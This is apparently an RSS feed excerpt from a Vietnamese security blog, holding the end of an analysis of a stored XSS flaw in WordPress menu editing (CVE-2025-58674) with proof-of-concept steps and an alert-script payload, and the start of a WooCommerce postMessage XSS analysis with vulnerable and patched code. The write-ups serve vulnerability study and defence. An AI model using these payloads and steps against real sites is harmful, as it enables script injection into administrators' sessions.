&lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Source&lt;/strong&gt;: &lt;code&gt;post-title&lt;/code&gt; ti√™u ƒë·ªÅ c·ªßa post&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Sink&lt;/strong&gt;: &lt;code&gt;parentDropdown.html( $html )&lt;/code&gt; c√≥ th·ªÉ ch·ª©a HTML ƒë·ªôc h·∫°i&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$html &amp;#43;= &amp;#39;&amp;lt;option &amp;#39; &amp;#43; $selected &amp;#43; &amp;#39; value=&amp;#34;&amp;#39; &amp;#43; menuID &amp;#43; &amp;#39;&amp;#34;&amp;gt;&amp;#39; &amp;#43; menuTitle &amp;#43; &amp;#39;&amp;lt;/option&amp;gt;&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;S·ª≠ d·ª•ng t√†i kho·∫£n author, t·∫°o post c√≥ title ch·ª©a XSS payload&lt;/li&gt;&#xA;&lt;li&gt;Admin truy c·∫≠p endpoint &lt;code&gt;wp-admin/nav-menus.php&lt;/code&gt; v√† th·ª±c hi·ªán add menus t·ª´ post v·ª´a t·∫°o&lt;/li&gt;&#xA;&lt;li&gt;S·ª± ki·ªán Javascript ƒë∆∞·ª£c k√≠ch ho·∫°t&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/xss.png&#34;&#xA;    alt=&#34;Proof of Concept: XSS&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Proof of Concept: XSS&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Th·∫ª &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; n·∫±m trong &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; thu·ªôc &lt;code&gt;&amp;lt;select&amp;gt;&lt;/code&gt; c√≥ th·ªÉ th·ª±c thi ƒë∆∞·ª£c nh∆∞ng c√°c th·∫ª kh√°c th√¨ kh√¥ng, ch·ªâ tr·∫£ v·ªÅ text ch·ª©a trong ƒë√≥.&#xA;{: .prompt-info }&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Khi browser parse chu·ªói HTML, &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; kh√¥ng n·∫±m trong flow &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; th·ª±c s·ª± m√† parser ‚Äúnh·∫•c‚Äù script ra kh·ªèi &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; v√† ƒë∆∞a v√†o DOM tree.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;select name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34;&amp;gt;&#xA;    &amp;lt;option value=&amp;#34;&amp;#34;&amp;gt;abc&amp;lt;/option&amp;gt;&#xA;    &amp;lt;option value=&amp;#34;&amp;#34;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;/option&amp;gt;&#xA;&amp;lt;/select&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;V√¨ th·∫ø, script th·ª±c thi ngay, c√≤n &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; v·∫´n t·ªìn t·∫°i, nh∆∞ng n·ªôi dung &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; tr·ªëng ho·∫∑c hi·ªÉn th·ªã text r·ªóng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/inspect1.png&#34;&#xA;    alt=&#34;Inspect DOM sau khi script ƒë∆∞·ª£c t√°ch&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Inspect DOM sau khi script ƒë∆∞·ª£c t√°ch&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;ƒê·ªëi v·ªõi c√°c th·∫ª kh√°c&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;select name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34;&amp;gt;&#xA;&#x9;&amp;lt;option value=&amp;#34;&amp;#34;&amp;gt;abc&amp;lt;/option&amp;gt;&#xA;&#x9;&amp;lt;option value=&amp;#34;&amp;#34;&amp;gt;&amp;lt;b&amp;gt;abd&amp;lt;/b&amp;gt;&amp;lt;/option&amp;gt;&#xA;&amp;lt;/select&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Browser tu√¢n th·ªß spec: &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; ch·ªâ ch·ª©a text-only.&lt;/li&gt;&#xA;&lt;li&gt;Khi parse &lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt; ho·∫∑c &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; trong &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt; b·ªã coi l√† text =&amp;gt; m·∫•t tag, ch·ªâ hi·ªÉn th·ªã abd nh∆∞ text.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; b·ªã lo·∫°i b·ªè ho√†n to√†n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/inspect2.png&#34;&#xA;    alt=&#34;Inspect: render option v·ªõi th·∫ª inline&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Inspect: render option v·ªõi th·∫ª inline&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-58674 cho th·∫•y r·ªßi ro khi ch√®n d·ªØ li·ªáu ng∆∞·ªùi d√πng tr·ª±c ti·∫øp v√†o HTML b·∫±ng &lt;code&gt;html()&lt;/code&gt; ho·∫∑c &lt;code&gt;innerHTML&lt;/code&gt;. &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; trong &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; ƒë∆∞·ª£c parser t√°ch ra v√† th·ª±c thi, trong khi c√°c th·∫ª kh√°c b·ªã b·ªè ho·∫∑c coi l√† text. B·∫£n v√° s·ª≠ d·ª•ng thu·ªôc t√≠nh &lt;code&gt;text&lt;/code&gt; ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n, lo·∫°i b·ªè XSS.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng n·ªëi chu·ªói HTML t·ª´ d·ªØ li·ªáu user r·ªìi ch√®n b·∫±ng &lt;code&gt;html()&lt;/code&gt;/&lt;code&gt;innerHTML&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;D√πng API t·∫°o element an to√†n (&lt;code&gt;option.text&lt;/code&gt;, &lt;code&gt;document.createElement&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n escape/sanitize d·ªØ li·ªáu ·ªü c·∫£ server v√† client.&lt;/li&gt;&#xA;&lt;li&gt;Hi·ªÉu h√†nh vi parser: &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; c√≥ th·ªÉ tho√°t kh·ªèi container inert.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet ‚Äî PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Core &amp;lt;= 6.8.2 is vulnerable to Cross Site Scripting (XSS) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-5062 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-10-cve-2025-5062/</link>
      <pubDate>Fri, 10 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-10-cve-2025-5062/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-10-cve-2025-5062/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin WooCommerce cho WordPress c√≥ l·ªó h·ªïng &lt;strong&gt;Cross-Site Scripting (XSS) d·ª±a tr√™n PostMessage&lt;/strong&gt; th√¥ng qua trang &lt;strong&gt;&amp;lsquo;customize-store&amp;rsquo;&lt;/strong&gt; ·ªü t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm &lt;strong&gt;9.4.2&lt;/strong&gt;, do vi·ªác &lt;strong&gt;x·ª≠ l√Ω d·ªØ li·ªáu PostMessage ch∆∞a ƒë·ªß an to√†n&lt;/strong&gt; (kh√¥ng l·ªçc ƒë·∫ßu v√†o v√† kh√¥ng escape d·ªØ li·ªáu khi xu·∫•t ra). ƒêi·ªÅu n√†y cho ph√©p &lt;strong&gt;k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c&lt;/strong&gt; ch√®n c√°c ƒëo·∫°n script t√πy √Ω v√†o trang web, m√† s·∫Ω th·ª±c thi n·∫øu h·ªç l·ª´a ƒë∆∞·ª£c ng∆∞·ªùi d√πng th·ª±c hi·ªán m·ªôt h√†nh ƒë·ªông, v√≠ d·ª• nh∆∞ &lt;strong&gt;click v√†o m·ªôt li√™n k·∫øt&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-5062&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-5062&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting (XSS)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 9.3.2 and from 9.4 through 9.4.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 9.3.4 and 9.4.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (6.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/woocommerce/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WooCommerce Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;WooCommerce&lt;/strong&gt;: &lt;strong&gt;9.4.2&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;9.4.3&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Trong phi√™n b·∫£n &lt;strong&gt;vulnerable&lt;/strong&gt;, &lt;code&gt;attachParentListeners()&lt;/code&gt; l·∫Øng nghe t·∫•t c·∫£ c√°c message t·ª´ b·∫•t k·ª≥ ngu·ªìn n√†o m√† kh√¥ng ki·ªÉm tra origin, d·ªØ li·ªáu t·ª´ message ƒë∆∞·ª£c g√°n tr·ª±c ti·∫øp v√†o DOM d·∫´n ƒë·∫øn nguy c∆° &lt;strong&gt;PostMessage-Based XSS&lt;/strong&gt; (sub-type c·ªßa &lt;strong&gt;DOM-based XSS&lt;/strong&gt;).&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;export function attachParentListeners() {&#xA;&#x9;const listener = ( event ) =&amp;gt; {&#xA;    if ( event.data.type === &amp;#39;navigate&amp;#39; ) {&#xA;&#x9;&#x9;&#x9;window.location.href = event.data.url;&#xA;    }&#xA;&#x9;};&#xA;  window.addEventListener( &amp;#39;message&amp;#39;, listener, false );&#xA;  return () =&amp;gt; {&#xA;    window.removeEventListener( &amp;#39;message&amp;#39;, listener, false );&#xA;  };&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;{: file=&amp;ldquo;client/admin/client/customize-store/utils.js v9.4.2&amp;rdquo;}&lt;/p&gt;&#xA;&lt;p&gt;Trong phi√™n b·∫£n &lt;strong&gt;patched&lt;/strong&gt;, m√£ ƒë√£ b·ªï sung nhi·ªÅu l·ªõp ki·ªÉm tra v√† h·∫°n ch·∫ø so v·ªõi phi√™n b·∫£n vulnerable, chuy·ªÉn t·ª´ &lt;code&gt;‚Äúch·∫•p nh·∫≠n m·ªçi message v√† redirect th·∫≥ng‚Äù&lt;/code&gt; sang &lt;code&gt;‚Äúch·ªâ ch·∫•p nh·∫≠n message ƒë√°ng tin, x√°c th·ª±c c·∫•u tr√∫c v√† ki·ªÉm tra URL tr∆∞·ªõc khi ƒëi·ªÅu h∆∞·ªõng‚Äù&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;export function attachParentListeners() {&#xA;  const allowedOrigins = [ getAdminSetting( &amp;#39;homeUrl&amp;#39; ) ];&#xA;&#xA;&#x9;function handleMessage( event ) {&#xA;&#x9;&#x9;// Validate the origin.&#xA;&#x9;&#x9;if ( ! allowedOrigins.includes( event.origin ) ) {&#xA;&#x9;&#x9;&#x9;// Blocked message from untrusted origin: event.origin.&#xA;&#x9;&#x9;&#x9;return;&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;// Validate the structure of event.data.&#xA;&#x9;&#x9;if (&#xA;&#x9;&#x9;&#x9;! event.data ||&#xA;&#x9;&#x9;&#x9;typeof event.data.type !== &amp;#39;string&amp;#39; ||&#xA;&#x9;&#x9;&#x9;typeof event.data.url !== &amp;#39;string&amp;#39;&#xA;&#x9;&#x9;) {&#xA;&#x9;&#x9;&#x9;// Invalid message structure: event.data.&#xA;&#x9;&#x9;&#x9;return;&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;// Only allow the &amp;#39;navigate&amp;#39; type.&#xA;&#x9;&#x9;if ( event.data.type === &amp;#39;navigate&amp;#39; ) {&#xA;      // Validate the URL format.&#xA;&#x9;&#x9;&#x9;try {&#xA;&#x9;&#x9;&#x9;&#x9;const url = parseAdminUrl( event.data.url );&#xA;&#x9;&#x9;&#x9;&#x9;// Further restrict navigation to trusted domains.&#xA;&#x9;&#x9;&#x9;&#x9;if (&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;! allowedOrigins.some( ( origin ) =&amp;gt; url.origin === origin )&#xA;&#x9;&#x9;&#x9;&#x9;) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;throw new Error(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;`Blocked navigation to untrusted URL: ${ url.href 